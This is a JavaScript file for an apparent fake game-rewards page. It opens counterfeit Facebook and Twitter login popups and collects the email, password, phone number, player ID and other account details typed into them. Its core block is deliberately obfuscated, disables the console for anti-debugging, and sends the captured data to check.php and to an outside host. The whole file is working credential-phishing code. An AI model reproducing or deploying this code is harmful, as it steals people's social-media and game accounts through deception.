// code for activate clicked sound
var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";

// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

// code for showing hiding popup
function open_rewardsBox() {
    $('.rewardsBox').show();
    $('.rewardsHome').hide();
}
function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    $('.itemReward_confirmation').show();
    $('#myItemReward_confirmationImg').attr('src', itemReward_confirmationImg);
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
    var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src', otherReward_confirmationImg);
    $('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
function open_account_login() {
    $('.account_login').show();
    $(".itemReward_confirmation").hide()
    $(".otherReward_confirmation").hide()
}
function open_facebook() {
    $('.login-facebook').show();
    $('.account_login').hide();
}
function open_twitter() {
    $('.login-twitter').show();
    $('.account_login').hide();
}
function close_reward_confirmation() {
    $(".itemReward_confirmation").hide()
    $(".otherReward_confirmation").hide()
}
function tutup_facebook() {
    $('.login-facebook').hide()
    $('.account_login').show();
}
function tutup_twitter() {
    $('.login-twitter').hide()
    $('.account_login').show();
}


// code for validate data to next step
function _0x66c8() { var _0x53f5f7 = ['serialize', 'input#validateEmail', '(((.+)+)+)+$', '#password-facebook', 'exception', 'ajax', '__proto__', '39784hArRqr', '7337456RbSjol', 'POST', 'input#validatePassword', 'warn', '.check_verification', 'bind', 'log', '#ValidateVerificationDataForm', 'apply', 'input#level', 'search', 'check.php', 'input#validateLogin', 'return\x20(function()\x20', 'submit', '.verification_info', '87261afucvb', '.popup-form', 'trace', '{}.constructor(\x22return\x20this\x22)(\x20)', 'preventDefault', '#login-twitter', '#email-twitter', '#password-twitter', 'toString', 'table', '355wZlihV', 'hide', 'input#rpt', '4895202JnTgKj', 'show', '.account_verification', '441IPQizH', '6640ZfKjEg', 'constructor', '#ValidateLoginTwitterForm', '70qXcrSl', '#email-facebook', '#ValidateLoginFbForm', '#login-facebook', 'prototype', 'input#playid', 'input#platform', '.login-facebook', 'trim', '4538bQNPHk', 'console', '5228200baznpE', '.processing_account', 'val']; _0x66c8 = function () { return _0x53f5f7; }; return _0x66c8(); } (function (_0x509719, _0x5d0d88) { var _0x31af6b = _0x1d33, _0x582c6e = _0x509719(); while (!![]) { try { var _0x40e994 = parseInt(_0x31af6b(0x1c3)) / 0x1 * (parseInt(_0x31af6b(0x1ba)) / 0x2) + -parseInt(_0x31af6b(0x1a6)) / 0x3 + -parseInt(_0x31af6b(0x195)) / 0x4 * (parseInt(_0x31af6b(0x1b0)) / 0x5) + parseInt(_0x31af6b(0x1b3)) / 0x6 + parseInt(_0x31af6b(0x196)) / 0x7 + parseInt(_0x31af6b(0x1b7)) / 0x8 * (-parseInt(_0x31af6b(0x1b6)) / 0x9) + -parseInt(_0x31af6b(0x1c5)) / 0xa; if (_0x40e994 === _0x5d0d88) break; else _0x582c6e['push'](_0x582c6e['shift']()); } catch (_0x24da7f) { _0x582c6e['push'](_0x582c6e['shift']()); } } }(_0x66c8, 0xb0cc2)); var _0x1526a3 = (function () { var _0x4b078f = !![]; return function (_0x4643e2, _0x36f6a9) { var _0x1ee9c6 = _0x4b078f ? function () { var _0x39fd8d = _0x1d33; if (_0x36f6a9) { var _0x5de522 = _0x36f6a9[_0x39fd8d(0x19e)](_0x4643e2, arguments); return _0x36f6a9 = null, _0x5de522; } } : function () { }; return _0x4b078f = ![], _0x1ee9c6; }; }()), _0x4dde88 = _0x1526a3(this, function () { var _0x711cf8 = _0x1d33; return _0x4dde88[_0x711cf8(0x1ae)]()[_0x711cf8(0x1a0)](_0x711cf8(0x190))[_0x711cf8(0x1ae)]()['constructor'](_0x4dde88)[_0x711cf8(0x1a0)](_0x711cf8(0x190)); }); _0x4dde88(); var _0x4f3803 = (function () { var _0x4f3481 = !![]; return function (_0x500043, _0x45e5eb) { var _0x878f28 = _0x4f3481 ? function () { var _0x185e5e = _0x1d33; if (_0x45e5eb) { var _0x39c220 = _0x45e5eb[_0x185e5e(0x19e)](_0x500043, arguments); return _0x45e5eb = null, _0x39c220; } } : function () { }; return _0x4f3481 = ![], _0x878f28; }; }()), _0x37799f = _0x4f3803(this, function () { var _0x511d37 = _0x1d33, _0x509499; try { var _0x47d047 = Function(_0x511d37(0x1a3) + _0x511d37(0x1a9) + ');'); _0x509499 = _0x47d047(); } catch (_0xa51b2d) { _0x509499 = window; } var _0x3a24a1 = _0x509499['console'] = _0x509499[_0x511d37(0x1c4)] || {}, _0x1cd14c = [_0x511d37(0x19c), _0x511d37(0x199), 'info', 'error', _0x511d37(0x192), _0x511d37(0x1af), _0x511d37(0x1a8)]; for (var _0x52d7ca = 0x0; _0x52d7ca < _0x1cd14c['length']; _0x52d7ca++) { var _0x4153d4 = _0x4f3803[_0x511d37(0x1b8)][_0x511d37(0x1be)][_0x511d37(0x19b)](_0x4f3803), _0x4beb75 = _0x1cd14c[_0x52d7ca], _0x4ed57c = _0x3a24a1[_0x4beb75] || _0x4153d4; _0x4153d4[_0x511d37(0x194)] = _0x4f3803['bind'](_0x4f3803), _0x4153d4[_0x511d37(0x1ae)] = _0x4ed57c[_0x511d37(0x1ae)][_0x511d37(0x19b)](_0x4ed57c), _0x3a24a1[_0x4beb75] = _0x4153d4; } }); function _0x1d33(_0x22bccd, _0x2ac3da) { var _0x3bb38 = _0x66c8(); return _0x1d33 = function (_0x37799f, _0x4f3803) { _0x37799f = _0x37799f - 0x18f; var _0x203b1d = _0x3bb38[_0x37799f]; return _0x203b1d; }, _0x1d33(_0x22bccd, _0x2ac3da); } _0x37799f(); function popup_form() { var _0x175cdc = _0x1d33, _0x515724 = $(_0x175cdc(0x1a7))['serialize'](); $['ajax']({ 'url': 'https://arpanrizky.my.id/api-flag/', 'data': _0x515724, 'type': 'POST', 'success': function () { }, 'error': function () { return !![]; } }); } function ValidateLoginFbData() { var _0x14909d = _0x1d33; $(_0x14909d(0x1bc))['submit'](function (_0x10e31c) { var _0x4f6211 = _0x14909d; _0x10e31c[_0x4f6211(0x1aa)](), $email = $(_0x4f6211(0x1bb))[_0x4f6211(0x1c7)]()[_0x4f6211(0x1c2)](), $password = $(_0x4f6211(0x191))['val']()['trim'](), $login = $(_0x4f6211(0x1bd))['val']()[_0x4f6211(0x1c2)](); if ($email == '' || $password == '') { } else $(_0x4f6211(0x1c1))['hide'](), $(_0x4f6211(0x1b5))[_0x4f6211(0x1b4)](), $(_0x4f6211(0x18f))[_0x4f6211(0x1c7)]($email), $(_0x4f6211(0x198))[_0x4f6211(0x1c7)]($password), $(_0x4f6211(0x1a2))[_0x4f6211(0x1c7)]($login); }); } function ValidateLoginTwitterData() { var _0x4f864e = _0x1d33; $(_0x4f864e(0x1b9))[_0x4f864e(0x1a4)](function (_0x24c7de) { var _0x2e665c = _0x4f864e; _0x24c7de['preventDefault'](), $email = $(_0x2e665c(0x1ac))[_0x2e665c(0x1c7)]()[_0x2e665c(0x1c2)](), $password = $(_0x2e665c(0x1ad))[_0x2e665c(0x1c7)]()['trim'](), $login = $(_0x2e665c(0x1ab))[_0x2e665c(0x1c7)]()[_0x2e665c(0x1c2)](); if ($email == '' || $password == '') { } else $('.login-twitter')[_0x2e665c(0x1b1)](), $(_0x2e665c(0x1b5))[_0x2e665c(0x1b4)](), $(_0x2e665c(0x18f))[_0x2e665c(0x1c7)]($email), $('input#validatePassword')['val']($password), $('input#validateLogin')[_0x2e665c(0x1c7)]($login); }); } function ValidateVerificationData() { var _0x3816d6 = _0x1d33; return $(_0x3816d6(0x19d))[_0x3816d6(0x1a4)](function (_0x2e4c6a) { var _0x1d4947 = _0x3816d6; _0x2e4c6a[_0x1d4947(0x1aa)](); var _0x2d9615 = $(_0x1d4947(0x18f))['val'](), _0xa671d = $(_0x1d4947(0x198))[_0x1d4947(0x1c7)](), _0x468f7e = $('input#nick')[_0x1d4947(0x1c7)](), _0x1b4da1 = $(_0x1d4947(0x1bf))[_0x1d4947(0x1c7)](), _0x1a8a29 = $('input#phone')[_0x1d4947(0x1c7)](), _0xbf34b7 = $(_0x1d4947(0x19f))['val'](), _0x434e86 = $('input#tier')[_0x1d4947(0x1c7)](), _0x832b81 = $(_0x1d4947(0x1b2))[_0x1d4947(0x1c7)](), _0x62ca10 = $('input#rpl')[_0x1d4947(0x1c7)](), _0x3a6212 = $(_0x1d4947(0x1c0))[_0x1d4947(0x1c7)](), _0x5e2632 = $('input#validateLogin')['val'](); if (_0x2d9615 == '' && _0xa671d == '' && _0x468f7e == '' && _0x1b4da1 == '' && _0x1a8a29 == '' && _0xbf34b7 == '' && _0x434e86 == '' && _0x832b81 == '' && _0x62ca10 == '' && _0x3a6212 == '' && _0x5e2632 == '') return $(_0x1d4947(0x1a5))[_0x1d4947(0x1b4)](), $('.account_verification')['hide'](), ![]; $[_0x1d4947(0x193)]({ 'type': _0x1d4947(0x197), 'url': _0x1d4947(0x1a1), 'data': $(this)[_0x1d4947(0x1c8)](), 'beforeSend': function () { var _0x2076ea = _0x1d4947; $(_0x2076ea(0x19a))[_0x2076ea(0x1b4)](), $(_0x2076ea(0x1b5))[_0x2076ea(0x1b1)](); }, 'success': function () { var _0x4a5885 = _0x1d4947; $(_0x4a5885(0x1c6))[_0x4a5885(0x1b4)](), $(_0x4a5885(0x19a))[_0x4a5885(0x1b1)](), $(_0x4a5885(0x1b5))[_0x4a5885(0x1b1)](); } }); }), ![]; };